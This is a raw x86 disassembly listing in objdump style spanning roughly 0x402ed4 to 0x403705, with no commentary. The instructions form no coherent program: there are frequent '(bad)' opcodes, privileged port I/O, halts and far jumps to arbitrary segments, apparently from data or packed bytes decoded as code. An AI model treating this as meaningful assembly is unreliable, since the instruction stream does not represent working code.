  402ed4:	or     DWORD PTR [ebx+0x4ac772e6],ebx
  402eda:	out    dx,al
  402edb:	push   ecx
  402edc:	mov    ecx,0xeb07bb9
  402ee1:	out    0xa,eax
  402ee3:	jae    0x402ed0
  402ee5:	inc    edx
  402ee6:	mov    ecx,DWORD PTR [ebx]
  402ee8:	pop    ebp
  402ee9:	loope  0x402ee5
  402eeb:	(bad)  
  402eec:	loopne 0x402f35
  402eee:	mov    ecx,0x13d65eab
  402ef3:	das    
  402ef4:	xlat   BYTE PTR ds:[ebx]
  402ef5:	sub    ch,cl
  402ef7:	stc    
  402ef8:	fwait
  402ef9:	sub    eax,0x2dbea143
  402efe:	cmp    eax,0x12647f4f
  402f03:	mov    bh,0x5d
  402f05:	push   edi
  402f06:	jecxz  0x402eab
  402f08:	dec    ebp
  402f09:	push   ebx
  402f0a:	xor    esp,DWORD PTR [esi+edi*1]
  402f0d:	adc    esi,DWORD PTR [eax+eiz*4]
  402f10:	scas   eax,DWORD PTR es:[edi]
  402f11:	push   cs
  402f12:	xchg   ebx,eax
  402f13:	add    BYTE PTR [ebp+ebx*1+0x79eaedee],0xa5
  402f1b:	jmp    0xda52:0x5e46c75e
  402f22:	sbb    al,0x71
  402f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f25:	lods   al,BYTE PTR ds:[esi]
  402f26:	mov    esp,0x415207a0
  402f2b:	(bad)  
  402f2c:	jge    0x402ecf
  402f2e:	loop   0x402eef
  402f30:	xlat   BYTE PTR cs:[ebx]
  402f32:	inc    ebp
  402f33:	pop    ss
  402f34:	mov    BYTE PTR [ebx],cl
  402f36:	sbb    DWORD PTR [ebp-0x5ed5fa0f],ecx
  402f3c:	and    dh,dl
  402f3e:	das    
  402f3f:	push   cs
  402f40:	mov    dh,0xc
  402f42:	jmp    0x402ec8
  402f44:	xchg   esp,eax
  402f45:	dec    esi
  402f46:	add    eax,0xe4c0c422
  402f4b:	xchg   ecx,eax
  402f4c:	ror    BYTE PTR [esi+0x37],cl
  402f4f:	fild   DWORD PTR [edi+0x5e]
  402f52:	les    ecx,FWORD PTR [ebp-0x70633739]
  402f58:	jle    0x402f76
  402f5a:	hlt    
  402f5b:	and    al,BYTE PTR [edx-0x1b]
  402f5e:	push   ebp
  402f5f:	pop    ebp
  402f60:	dec    edi
  402f61:	int3   
  402f62:	out    dx,al
  402f63:	push   ebp
  402f64:	cmp    bh,bh
  402f66:	or     esi,DWORD PTR [edi]
  402f68:	xlat   BYTE PTR ds:[ebx]
  402f69:	pusha  
  402f6a:	lock gs mov eax,0xbc3fb4c9
  402f71:	cmp    eax,0x91759fee
  402f76:	dec    ecx
  402f77:	loope  0x402fb1
  402f79:	pusha  
  402f7a:	xor    ah,BYTE PTR [ecx+0x66145ae2]
  402f80:	add    DWORD PTR [edi+0x5e],0x6c
  402f84:	push   ecx
  402f85:	leave  
  402f86:	(bad)  
  402f87:	cmp    eax,DWORD PTR [esi]
  402f89:	xchg   ecx,eax
  402f8a:	out    dx,al
  402f8b:	ins    DWORD PTR es:[edi],dx
  402f8c:	gs push esi
  402f8e:	fmul   QWORD PTR [edi]
  402f90:	xor    eax,0xbca17319
  402f95:	push   esp
  402f96:	(bad)  
  402f97:	leave  
  402f98:	iret   
  402f99:	inc    ebx
  402f9a:	les    ebx,FWORD PTR [eax+0x31e1ea46]
  402fa0:	pop    esi
  402fa1:	(bad)  
  402fa2:	lahf   
  402fa3:	sbb    eax,0xcc195f2b
  402fa8:	cld    
  402fa9:	pusha  
  402faa:	mov    ecx,es
  402fac:	dec    ecx
  402fad:	retf   0x221b
  402fb0:	push   0x4c38efc5
  402fb5:	fucomp st(7)
  402fb7:	inc    eax
  402fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb9:	cwde   
  402fba:	(bad)  
  402fbb:	jge    0x402fc6
  402fbd:	inc    ebx
  402fbe:	fcom   DWORD PTR ds:0x9d6e26d3
  402fc4:	jecxz  0x402fd5
  402fc6:	jo     0x402fd6
  402fc8:	sub    DWORD PTR [edi],eax
  402fca:	out    dx,al
  402fcb:	inc    esi
  402fcc:	cmp    eax,0xa9e76e05
  402fd1:	mov    eax,ds:0xd81fa1a0
  402fd6:	push   es
  402fd7:	dec    ebx
  402fd8:	mov    edx,DWORD PTR [esp+ebp*4+0x41]
  402fdc:	arpl   WORD PTR [ecx],bx
  402fde:	ds dec ecx
  402fe0:	fisttp WORD PTR [bx+di-0x11]
  402fe4:	sub    al,0x41
  402fe6:	add    eax,ebp
  402fe8:	mov    edi,0xc7eb3360
  402fed:	inc    ebx
  402fee:	mov    ebp,0xeef34d7e
  402ff3:	data16 adc al,0x91
  402ff6:	adc    BYTE PTR [ecx-0x22],dh
  402ff9:	aad    0x8f
  402ffb:	mov    eax,ds:0xf9c1e05f
  403000:	push   eax
  403001:	or     al,0x2b
  403003:	push   cs
  403004:	pop    esi
  403005:	jb     0x402ffe
  403007:	mov    al,BYTE PTR [edi]
  403009:	jg     0x402fce
  40300b:	or     edx,edi
  40300d:	pop    ecx
  40300e:	cmp    DWORD PTR ds:0x30aef861,ecx
  403014:	sub    bh,0xa
  403017:	xor    BYTE PTR [edi],0x6b
  40301a:	and    DWORD PTR cs:[ebp-0x3],eax
  40301e:	(bad)  
  40301f:	sar    DWORD PTR [ebx],cl
  403021:	out    0x3a,eax
  403023:	mov    ds:0x4ba9c59,al
  403028:	xchg   ecx,eax
  403029:	ret    0x518e
  40302c:	mov    cl,0x1f
  40302e:	out    dx,eax
  40302f:	sbb    ebp,DWORD PTR [esi+ecx*2+0x60ceff0f]
  403036:	pop    ebp
  403037:	push   ds
  403038:	(bad)  
  403039:	xlat   BYTE PTR ds:[ebx]
  40303a:	sub    ch,BYTE PTR [eax+0x6814aec6]
  403040:	jae    0x403039
  403042:	outs   dx,BYTE PTR ds:[esi]
  403043:	push   esp
  403044:	data16 sub al,0xa2
  403047:	sub    BYTE PTR [esi+0x1],bl
  40304a:	push   edi
  40304b:	aaa    
  40304c:	pop    eax
  40304d:	jge    0xe700e1f9
  403053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403054:	dec    esi
  403055:	add    eax,0x90f0b160
  40305a:	sti    
  40305b:	pop    es
  40305c:	cmp    edi,DWORD PTR [esi+ebp*8]
  40305f:	jb     0x402fff
  403061:	mov    al,0xa5
  403063:	imul   ebp,DWORD PTR [esi-0x665c001a],0xc51d9b7
  40306d:	ficom  WORD PTR [ebp+0x25]
  403070:	or     BYTE PTR [ecx+0x6e9d114e],0xee
  403077:	sbb    BYTE PTR [eax+0x59d9811],0xea
  40307e:	int3   
  40307f:	mov    al,ds:0xd0038ebe
  403084:	loope  0x40302d
  403086:	inc    ebx
  403087:	sub    eax,0x8d19695e
  40308c:	into   
  40308d:	out    0x99,al
  40308f:	pushf  
  403090:	ret    0x7060
  403093:	push   edx
  403094:	cs hlt 
  403096:	aaa    
  403097:	push   ds
  403098:	push   es
  403099:	fucomip st,st(7)
  40309b:	inc    ecx
  40309c:	or     eax,0x2f80c36a
  4030a1:	inc    edx
  4030a2:	cwde   
  4030a3:	cmp    al,0x89
  4030a5:	pop    esi
  4030a6:	mov    eax,0x25ea41be
  4030ab:	adc    eax,0x9762fdfe
  4030b0:	xor    bl,dh
  4030b2:	(bad)  
  4030b3:	mov    ds:0x33bad73f,eax
  4030b8:	sub    ah,BYTE PTR [edx-0x6ad2bb2]
  4030be:	push   eax
  4030bf:	mov    eax,ds:0xe1ce6274
  4030c4:	mov    dh,BYTE PTR ds:0x935e4056
  4030ca:	push   ecx
  4030cb:	dec    ebx
  4030cc:	fcmove st,st(5)
  4030ce:	or     al,0x4f
  4030d0:	sbb    DWORD PTR ds:0xdb5e6721,eax
  4030d6:	mov    ebx,0x77f9e1b6
  4030db:	mov    ds:0x4a231def,eax
  4030e0:	push   ss
  4030e1:	loope  0x403133
  4030e3:	call   0x5a7a:0x85be8181
  4030ea:	xor    al,0x56
  4030ec:	cmp    bh,bh
  4030ee:	inc    ecx
  4030ef:	test   eax,0x2a7eca5e
  4030f4:	lock mov dh,0x6a
  4030f7:	lock pop ds
  4030f9:	popa   
  4030fa:	adc    BYTE PTR [eax+0x15],cl
  4030fd:	fbstp  TBYTE PTR [eax-0x11fc9943]
  403103:	cmp    BYTE PTR [eax+0x56eb03a5],0xcb
  40310a:	inc    ebp
  40310b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40310c:	sub    DWORD PTR [edx-0x419eada5],esp
  403112:	ss xchg ebx,eax
  403114:	adc    al,0xcd
  403116:	cmc    
  403117:	hlt    
  403118:	fwait
  403119:	repz and BYTE PTR [ecx],ah
  40311c:	add    BYTE PTR [ebx+0x60ad5e3b],0xf9
  403123:	leave  
  403124:	js     0x403177
  403126:	out    0xdd,eax
  403128:	and    ah,0xe7
  40312b:	add    al,0x44
  40312d:	retf   
  40312e:	(bad)  
  40312f:	xor    cl,BYTE PTR [esi]
  403131:	add    BYTE PTR [esi+ecx*4-0x3a3c9f5f],dh
  403138:	jmp    0x403143
  40313a:	fs xchg ebp,eax
  40313c:	pop    edi
  40313d:	sub    dh,ch
  40313f:	pusha  
  403140:	adc    DWORD PTR [ebp-0x66],0xbee66967
  403147:	mov    ds:0x646371c4,eax
  40314c:	add    DWORD PTR [eax+0x36],edi
  40314f:	and    DWORD PTR [edx+0x6a],ebx
  403152:	and    al,0xb1
  403154:	gs jmp 0x618bdeee
  40315a:	data16 add dl,bl
  40315d:	dec    esp
  40315e:	shl    esi,1
  403160:	xchg   esp,eax
  403161:	daa    
  403162:	ja     0x4030f2
  403164:	fdivr  QWORD PTR ds:0xf56520e6
  40316a:	inc    edx
  40316b:	or     DWORD PTR [eax+0x59],ebx
  40316e:	pusha  
  40316f:	pop    edx
  403170:	lock jmp 0x7e29:0xddb12c26
  403178:	push   ecx
  403179:	js     0x403138
  40317b:	inc    eax
  40317c:	mov    ?,WORD PTR [edi+0x2e]
  40317f:	mov    eax,ds:0xb5ee73a
  403184:	jmp    0x4031ea
  403186:	and    eax,0x5bba5943
  40318b:	xchg   ecx,eax
  40318c:	cmc    
  40318d:	repnz daa 
  40318f:	fisub  DWORD PTR [edi-0x37a241a3]
  403195:	test   al,0x83
  403197:	test   DWORD PTR [esi-0xd57cc52],ecx
  40319d:	loop   0x4031ae
  40319f:	stc    
  4031a0:	add    eax,0xe9b46621
  4031a5:	pop    ss
  4031a6:	out    0xfd,eax
  4031a8:	jecxz  0x403155
  4031aa:	(bad)  
  4031ac:	shl    DWORD PTR ds:[ecx],cl
  4031af:	cmp    BYTE PTR [eax+eiz*2],ah
  4031b2:	jnp    0x40316e
  4031b4:	adc    dl,dh
  4031b6:	jno    0x40319b
  4031b8:	and    DWORD PTR [ebx+ecx*2-0x11d4d04f],ebx
  4031bf:	and    BYTE PTR ds:0xcb69e7cd,bh
  4031c5:	mov    cs,WORD PTR [eax-0x5f]
  4031c8:	jo     0x40323f
  4031ca:	into   
  4031cb:	mov    ds:0x468a19c0,eax
  4031d0:	jmp    0x9f03:0x6c77ef00
  4031d7:	cmp    al,0x6a
  4031d9:	ins    BYTE PTR es:[edi],dx
  4031da:	xchg   esi,eax
  4031db:	stos   BYTE PTR es:[edi],al
  4031dc:	arpl   WORD PTR [edi+0x60e6f7fc],di
  4031e2:	int3   
  4031e3:	stos   DWORD PTR es:[edi],eax
  4031e4:	not    BYTE PTR [edi]
  4031e6:	clc    
  4031e7:	popa   
  4031e8:	pop    esi
  4031e9:	dec    eax
  4031ea:	jno    0x4031d2
  4031ec:	mov    dl,0xce
  4031ee:	nop
  4031ef:	in     al,0x7b
  4031f1:	pop    edi
  4031f2:	enter  0xcc34,0xcb
  4031f6:	xchg   esi,eax
  4031f7:	fcmovu st,st(4)
  4031f9:	pushf  
  4031fa:	add    dh,BYTE PTR [edx]
  4031fc:	xor    al,0x10
  4031fe:	cdq    
  4031ff:	mov    eax,ds:0x4f633a62
  403204:	shl    eax,0xa3
  403207:	mov    eax,ds:0x23e10706
  40320c:	imul   edx,DWORD PTR [edx+edx*2-0x3f1aac9d],0xd4009b5a
  403217:	(bad)  
  403218:	out    dx,al
  403219:	shl    DWORD PTR [edi],cl
  40321b:	and    dl,BYTE PTR [eax-0x505d25a0]
  403221:	lods   al,BYTE PTR ds:[esi]
  403222:	stos   BYTE PTR es:[edi],al
  403223:	mov    BYTE PTR [ecx],dl
  403225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403226:	out    dx,al
  403227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403228:	popa   
  403229:	daa    
  40322a:	cmp    BYTE PTR [esi-0x53438614],cl
  403230:	jmp    0x9cf4:0x5f36ee39
  403237:	sbb    esi,DWORD PTR [ecx]
  403239:	push   ecx
  40323a:	es ret 0xe107
  40323e:	test   eax,0x4f3bc84b
  403243:	into   
  403244:	and    al,0x61
  403246:	mov    ecx,0xde3ed947
  40324b:	stos   DWORD PTR es:[edi],eax
  40324c:	jg     0x4031eb
  40324e:	out    dx,eax
  40324f:	fst    st(6)
  403251:	pop    es
  403252:	mov    dh,0x20
  403254:	pop    es
  403255:	lds    eax,FWORD PTR [edx+eiz*2-0x3a]
  403259:	pusha  
  40325a:	repnz gs int 0xa0
  40325e:	xchg   ebx,eax
  40325f:	mov    ch,0xff
  403261:	call   0x1921:0xbc87d3d7
  403268:	pop    esi
  403269:	xchg   edi,eax
  40326a:	(bad)  
  40326b:	in     eax,dx
  40326c:	or     BYTE PTR [eax+0x51eb0170],0xed
  403273:	das    
  403274:	repnz sahf 
  403276:	into   
  403277:	mov    edi,0xd66ed8ea
  40327c:	push   edx
  40327d:	xlat   BYTE PTR ds:[ebx]
  40327e:	outs   dx,DWORD PTR ds:[esi]
  40327f:	ret    
  403280:	jecxz  0x403294
  403282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403283:	or     eax,0xc92e045e
  403288:	popa   
  403289:	loopne 0x403237
  40328b:	div    DWORD PTR [ebx+0x60]
  40328e:	sbb    bh,BYTE PTR [ebx+0x1f1fabe2]
  403294:	shr    esp,cl
  403296:	and    cl,al
  403298:	push   cs
  403299:	loope  0x4032e9
  40329b:	retf   
  40329c:	enter  0x66f4,0x7a
  4032a0:	mov    esi,0xf9a4612c
  4032a5:	and    ebp,ebx
  4032a7:	jmp    0x403319
  4032a9:	add    DWORD PTR [esi+0x71],0x7c
  4032ad:	mov    esi,ebp
  4032af:	mov    eax,ds:0x5c343753
  4032b4:	data16 lods al,BYTE PTR ds:[esi]
  4032b6:	mov    BYTE PTR [ebp-0x5ed023c0],cl
  4032bc:	push   0x67
  4032be:	push   esi
  4032bf:	lock mov cl,dl
  4032c2:	cmc    
  4032c3:	das    
  4032c4:	(bad)  [esi]
  4032c6:	call   0xc889:0x499d2e21
  4032cd:	mov    al,0xa8
  4032cf:	mov    al,ds:0xf5a71dab
  4032d4:	pop    esp
  4032d5:	adc    eax,0xb75e7879
  4032da:	adc    edi,DWORD PTR [ecx]
  4032dc:	adc    DWORD PTR [esi+0x670b0df0],ebx
  4032e2:	sub    eax,0x6e47b2e0
  4032e7:	push   esp
  4032e8:	sbb    cl,BYTE PTR [ecx+ebp*2+0x16]
  4032ec:	mov    ds:0xf5a1ee5b,al
  4032f1:	sbb    bl,BYTE PTR [edi]
  4032f3:	and    eax,0xa1353792
  4032f8:	ficom  WORD PTR [edi-0x71]
  4032fb:	adc    eax,0x19ccbe84
  403300:	arpl   WORD PTR [edi+0x37],bp
  403303:	lods   eax,DWORD PTR ds:[esi]
  403304:	stos   DWORD PTR es:[edi],eax
  403305:	cmp    DWORD PTR [ecx+0x35657ed6],ebp
  40330b:	or     DWORD PTR [eax+0x61],ecx
  40330e:	push   cs
  40330f:	push   ds
  403310:	bound  eax,QWORD PTR [ebx]
  403312:	aas    
  403313:	dec    edx
  403314:	sub    eax,0xe6f6ffab
  403319:	mov    ecx,0x90254267
  40331e:	dec    esi
  40331f:	jmp    0xa100ad5a
  403324:	cmp    eax,0x50a1d97b
  403329:	loopne 0x40333a
  40332b:	aam    0xf0
  40332d:	add    eax,0x367671eb
  403332:	icebp  
  403333:	in     al,0xef
  403335:	mov    DWORD PTR [ebx],0x8b908b88
  40333b:	xchg   BYTE PTR [ecx-0x21ad3e9a],dl
  403341:	cmp    dh,cl
  403343:	cmp    BYTE PTR [esi*1+0x465f56de],dl
  40334a:	retf   0x9bfb
  40334d:	sbb    DWORD PTR [edi],esi
  40334f:	or     ebx,eax
  403351:	nop
  403352:	mul    DWORD PTR [eax-0x4bdf3df1]
  403358:	jmp    0xb96b:0x5b637a76
  40335f:	push   ecx
  403360:	dec    ebp
  403361:	push   ecx
  403362:	or     DWORD PTR [ebp+ebx*8+0x76],ebx
  403366:	dec    esi
  403367:	es ds jmp 0xd84d45e
  40336e:	xchg   edx,eax
  40336f:	mov    ebp,0xcb1c8a3
  403374:	pop    ebx
  403375:	push   edx
  403376:	(bad)  
  403378:	pushf  
  403379:	pop    si
  40337b:	jne    0x40338f
  40337d:	or     ah,BYTE PTR [ebx-0x5c30e853]
  403383:	dec    esi
  403384:	frstor [ebx]
  403386:	dec    edi
  403387:	aas    
  403388:	cdq    
  403389:	lods   eax,DWORD PTR ds:[esi]
  40338a:	lahf   
  40338b:	popa   
  40338c:	retf   
  40338d:	pop    ebx
  40338e:	in     eax,dx
  40338f:	push   ebx
  403390:	xchg   esi,eax
  403391:	dec    edx
  403392:	(bad)  
  403394:	xor    esi,edi
  403396:	push   edx
  403397:	or     DWORD PTR [ebx-0x54],edi
  40339a:	stc    
  40339b:	lods   eax,DWORD PTR ds:[esi]
  40339c:	mov    ah,0x3b
  40339e:	addr16 js 0x403420
  4033a1:	out    dx,eax
  4033a2:	js     0x403375
  4033a4:	sbb    al,0x8b
  4033a6:	inc    DWORD PTR [ebx+ebx*2+0x4cc13e1a]
  4033ad:	push   ebp
  4033ae:	(bad)  
  4033af:	and    ch,ah
  4033b1:	xchg   ebp,eax
  4033b2:	and    eax,0x60c37397
  4033b7:	mov    eax,ds:0xb91788ea
  4033bc:	int    0x4c
  4033be:	jmp    0x4033fd
  4033c0:	(bad)  
  4033c2:	scas   eax,DWORD PTR es:[edi]
  4033c3:	push   esi
  4033c4:	jbe    0x4033c6
  4033c6:	xchg   ebx,eax
  4033c7:	inc    ebx
  4033c9:	xor    BYTE PTR [ecx+0x3f5b40a1],al
  4033cf:	rcl    ah,1
  4033d1:	push   esp
  4033d2:	nop
  4033d3:	in     eax,dx
  4033d4:	cmp    bl,ch
  4033d6:	outs   dx,DWORD PTR ds:[esi]
  4033d7:	mov    ecx,0x38010f5e
  4033dc:	cmp    eax,0xd86d8f7e
  4033e1:	inc    ebx
  4033e2:	outs   dx,BYTE PTR ds:[esi]
  4033e3:	dec    edi
  4033e4:	test   eax,0xfe39a9e0
  4033e9:	sti    
  4033ea:	add    bh,BYTE PTR [edi-0x190ada0]
  4033f0:	loope  0x40341b
  4033f2:	jmp    0x403455
  4033f4:	lea    ebp,[eax]
  4033f6:	push   esi
  4033f7:	aaa    
  4033f8:	lds    esp,FWORD PTR [eax+0x21]
  4033fb:	mov    BYTE PTR [ebx-0x4f],dh
  4033fe:	jbe    0x403399
  403400:	ret    
  403401:	outs   dx,BYTE PTR ds:[esi]
  403402:	out    dx,al
  403403:	rcl    esi,cl
  403405:	mov    fs,WORD PTR [esi]
  403407:	add    ebx,DWORD PTR [esi*1+0x59f08ece]
  40340e:	and    al,0x61
  403410:	cmp    al,0x6
  403412:	xor    ah,BYTE PTR [ebp-0x80]
  403415:	imul   ebp,esi,0x7258b97e
  40341b:	out    dx,eax
  40341c:	pop    ds
  40341d:	cmp    cl,BYTE PTR [ebx-0x117b0553]
  403423:	mov    dh,0x7c
  403425:	inc    ebx
  403426:	dec    ebx
  403427:	xor    al,0x3a
  403429:	lods   eax,DWORD PTR ds:[esi]
  40342a:	jmp    0x4033b3
  40342c:	push   edx
  40342d:	int    0xb3
  40342f:	mov    bh,BYTE PTR [edx-0x2d76a038]
  403435:	pusha  
  403436:	add    BYTE PTR [ebx+0x1b7d677f],dl
  40343c:	jb     0x403468
  40343e:	jmp    0x4033ee
  403440:	dec    edx
  403441:	not    DWORD PTR [ebp+0x64f0accb]
  403447:	mov    bl,0x4e
  403449:	and    eax,0x60506af7
  40344e:	popf   
  40344f:	push   0x2416d458
  403454:	mov    edi,0x5e39d598
  403459:	retf   0xf21d
  40345c:	sub    ah,BYTE PTR [esi+0x612010f2]
  403462:	shl    cl,0x8c
  403465:	mov    al,es:0xee63a693
  40346b:	fisubr WORD PTR [ecx-0x2d]
  40346e:	pop    edx
  40346f:	pop    ss
  403470:	xchg   edx,eax
  403471:	sbb    eax,0x3689a17c
  403476:	or     bl,BYTE PTR [esi+0x3e]
  403479:	fdivp  st(7),st
  40347b:	push   ds
  40347c:	hlt    
  40347d:	and    DWORD PTR [ebp+0x69],0xcee8577
  403484:	jae    0x40341f
  403486:	(bad)
  40348a:	push   esi
  40348b:	mov    eax,ds:0xb647a09
  403490:	lds    edi,FWORD PTR [edi+0x5e]
  403493:	rcr    BYTE PTR [esi+0x56],cl
  403496:	lea    esi,[edx+0x2b9d81c0]
  40349c:	sub    BYTE PTR [ebx+0x47],dl
  40349f:	cli    
  4034a0:	pushf  
  4034a1:	or     dh,ch
  4034a3:	push   cs
  4034a4:	xor    al,0xd1
  4034a6:	test   BYTE PTR [edx+0x21095138],0xfc
  4034ad:	jmp    0xb5e0c8d1
  4034b2:	shl    DWORD PTR [edi+0x1d65f3d3],1
  4034b8:	fld    TBYTE PTR [edi]
  4034ba:	mov    eax,0xe2412734
  4034bf:	sti    
  4034c0:	in     eax,dx
  4034c1:	lods   al,BYTE PTR ds:[esi]
  4034c2:	out    dx,al
  4034c3:	add    DWORD PTR [ebp+0x533600e4],0x48
  4034ca:	sbb    BYTE PTR [ecx+0x4ac0928f],ah
  4034d0:	rcr    al,cl
  4034d2:	lock fwait
  4034d4:	test   BYTE PTR [esi-0x17],ch
  4034d7:	std    
  4034d8:	lea    edx,[ecx]
  4034da:	xor    DWORD PTR [edi+ebx*8-0x73],ecx
  4034de:	xor    cl,BYTE PTR [ebx+ebp*1-0x67]
  4034e2:	sar    edi,cl
  4034e4:	mov    edx,0x51bbca60
  4034e9:	loope  0x403476
  4034eb:	xor    DWORD PTR [edx-0x887123d],ecx
  4034f1:	ins    BYTE PTR es:[edi],dx
  4034f2:	in     eax,0x4e
  4034f4:	shl    BYTE PTR [esi+edx*2-0x5a1fb69],0xce
  4034fc:	adc    cl,BYTE PTR [ecx+eiz*4-0x1fb72200]
  403503:	adc    DWORD PTR [edx-0x23],edx
  403506:	mov    ebx,ecx
  403508:	pop    esi
  403509:	sahf   
  40350a:	out    dx,eax
  40350b:	pushf  
  40350c:	dec    edx
  40350d:	inc    edx
  40350e:	xor    BYTE PTR [ecx+0x55c66247],ah
  403514:	pusha  
  403515:	jb     0x403522
  403517:	mov    DWORD PTR [edi+0x34],ecx
  40351a:	sbb    BYTE PTR [esi],al
  40351c:	pop    esi
  40351d:	xor    dl,cl
  40351f:	rcr    ah,1
  403521:	and    eax,0x614578d8
  403526:	or     ah,dh
  403528:	mov    ds:0xfb35e5dd,eax
  40352d:	(bad)  
  40352e:	out    dx,al
  40352f:	dec    eax
  403530:	fisub  WORD PTR [edx+0x6332be66]
  403536:	xchg   esp,eax
  403537:	mov    eax,ds:0xe1b4b895
  40353c:	and    eax,0x5ea50780
  403541:	or     DWORD PTR [esi-0x1f955ab8],ebp
  403547:	test   DWORD PTR [eax],0xa25ac45e
  40354d:	jmp    0x4035c1
  40354f:	jb     0x403507
  403551:	fyl2xp1 
  403553:	(bad)  
  403554:	cmp    BYTE PTR [esi+0x15eecb0],dl
  40355a:	mov    dl,0xbb
  40355c:	and    bh,dh
  40355e:	repnz cmp al,0x58
  403561:	popa   
  403562:	fs (bad) 
  403564:	int3   
  403565:	daa    
  403566:	enter  0x32bc,0x62
  40356a:	out    dx,al
  40356b:	add    ah,BYTE PTR [eax-0x21]
  40356e:	and    ch,cl
  403570:	sbb    DWORD PTR [esi-0x54ce5e7f],ecx
  403576:	xchg   esp,eax
  403577:	sub    cl,ch
  403579:	sahf   
  40357a:	mov    ds:0x87c85b75,eax
  40357f:	(bad)  
  403580:	repz mov eax,ds:0xa95a0c3b
  403586:	push   ss
  403587:	stc    
  403588:	and    BYTE PTR [edi],ch
  40358a:	mov    ch,ch
  40358c:	push   ebx
  40358d:	popa   
  40358e:	xor    bl,BYTE PTR [ebx+0x435ef7a6]
  403594:	mov    dl,0x36
  403596:	out    dx,al
  403597:	pop    ebx
  403598:	adc    bh,BYTE PTR [ebx-0x43]
  40359b:	mov    ebx,0xa8472f0b
  4035a0:	or     al,0xe9
  4035a2:	mov    dl,0xf4
  4035a4:	mov    esi,0xdf3890d0
  4035a9:	das    
  4035aa:	mov    es:0x25006127,al
  4035b0:	and    eax,0xe7b78f1d
  4035b5:	pusha  
  4035b6:	sub    eax,DWORD PTR [ebx-0x7acd8db1]
  4035bc:	(bad)  
  4035bd:	pop    esi
  4035be:	out    dx,al
  4035bf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035c1:	lea    esp,[esi-0x44]
  4035c4:	adc    ebp,eax
  4035c6:	and    eax,0x6dd2726c
  4035cb:	mov    eax,ds:0x309e2fb9
  4035d0:	push   edi
  4035d1:	out    dx,eax
  4035d2:	in     al,dx
  4035d3:	ins    DWORD PTR es:[edi],dx
  4035d4:	pop    esi
  4035d5:	outs   dx,DWORD PTR ds:[esi]
  4035d6:	loope  0x403577
  4035d8:	stc    
  4035d9:	test   BYTE PTR [edi+0x5560d501],cl
  4035df:	add    al,bh
  4035e1:	rcr    esp,0xd9
  4035e4:	in     al,dx
  4035e5:	mov    esp,DWORD PTR [edx+0x44]
  4035e8:	sub    BYTE PTR [esi+ebp*8+0xf90aa14],0x48
  4035f0:	jae    0x403585
  4035f2:	mov    esp,0x9bc494a1
  4035f7:	cmp    al,0x1f
  4035f9:	daa    
  4035fa:	fadd   QWORD PTR [eax]
  4035fc:	lock jmp 0x4035ed
  4035ff:	and    bl,BYTE PTR [esi]
  403601:	dec    ebx
  403602:	mov    esi,0x1d3099b
  403607:	mov    eax,ds:0x855fbbd5
  40360c:	add    DWORD PTR [edx+0x21],edi
  40360f:	adc    al,0x64
  403611:	or     eax,ebp
  403613:	inc    edi
  403614:	dec    edx
  403615:	and    DWORD PTR [edi-0x546e283f],esi
  40361b:	mov    al,ds:0xde487ea4
  403620:	mov    ah,BYTE PTR [ebp-0x20]
  403623:	fs pop esi
  403625:	inc    ebp
  403626:	call   0xbcc8557
  40362b:	das    
  40362c:	loop   0x403652
  40362e:	dec    edx
  40362f:	mov    eax,ds:0xe21b75d5
  403634:	outs   dx,DWORD PTR ds:[esi]
  403635:	push   esp
  403636:	(bad)  
  403637:	ret    0xdc5e
  40363a:	inc    ebp
  40363b:	sbb    DWORD PTR [ebx-0x17745498],edi
  403641:	pusha  
  403642:	ins    BYTE PTR es:[edi],dx
  403643:	push   ebx
  403644:	mov    dh,0xb
  403646:	jne    0x4035e7
  403648:	jmp    0x40360f
  40364a:	bound  ebp,QWORD PTR [esi+0x67]
  40364d:	loopne 0x403689
  40364f:	mov    bl,BYTE PTR [edx]
  403651:	fsubr  QWORD PTR [ecx]
  403653:	inc    edx
  403654:	arpl   WORD PTR [edi+0x90d40f6],di
  40365a:	repz mov ebp,0x7b92612b
  403660:	sub    al,0x77
  403662:	xchg   esp,eax
  403663:	repz push 0x828be9c9
  403669:	aad    0xad
  40366b:	add    BYTE PTR [edi+0xa13f863],bl
  403671:	mov    ecx,0x60d265d3
  403676:	jns    0x40369c
  403678:	jp     0x40368d
  40367a:	inc    edx
  40367b:	inc    ecx
  40367c:	or     ecx,DWORD PTR [ecx-0x3e]
  40367f:	ret    
  403680:	sbb    BYTE PTR [eax],0x70
  403683:	mov    eax,ds:0xcb2ef8c4
  403688:	push   edx
  403689:	rol    DWORD PTR [edi+0x738da9a2],0x12
  403690:	cs js  0x403617
  403693:	dec    ebp
  403694:	lock jecxz 0x403686
  403697:	popa   
  403698:	jp     0x40369c
  40369a:	sbb    eax,0xf8c63801
  40369f:	jmp    0xaf0b:0x5e7060d6
  4036a6:	ins    BYTE PTR es:[edi],dx
  4036a7:	sbb    DWORD PTR [edx-0x48],ebp
  4036aa:	out    dx,al
  4036ab:	xchg   esp,eax
  4036ac:	push   esp
  4036ad:	bound  ecx,QWORD PTR ds:0x3376dc14
  4036b3:	mov    eax,ds:0xce03c17b
  4036b8:	xchg   edi,eax
  4036b9:	inc    esi
  4036ba:	(bad)  
  4036bc:	pop    esi
  4036bd:	add    eax,0x5d361f6d
  4036c2:	xor    eax,0xa2603d05
  4036c7:	cmp    eax,0x1ad3fa74
  4036cc:	outs   dx,BYTE PTR ds:[esi]
  4036cd:	rcr    BYTE PTR [ebp+0x3fda5b83],0x2
  4036d4:	inc    edi
  4036d5:	test   BYTE PTR [esi],cl
  4036d7:	xchg   ecx,eax
  4036d8:	dec    eax
  4036d9:	out    dx,eax
  4036da:	fwait
  4036db:	mov    eax,ds:0x1a07fd81
  4036e0:	pop    eax
  4036e1:	jmp    0x4036b5
  4036e3:	xor    DWORD PTR [ebx],0x386acf03
  4036e9:	out    0x36,eax
  4036eb:	mov    eax,ds:0xd0fad594
  4036f0:	fwait
  4036f1:	mov    ch,0x7e
  4036f3:	mov    eax,ds:0xe281009d
  4036f8:	pop    ecx
  4036f9:	and    BYTE PTR [ebp+esi*4+0x5e],0x5a
  4036fe:	sbb    al,0x6f
  403700:	xor    eax,0xd9eb120f
  403705:	pusha  
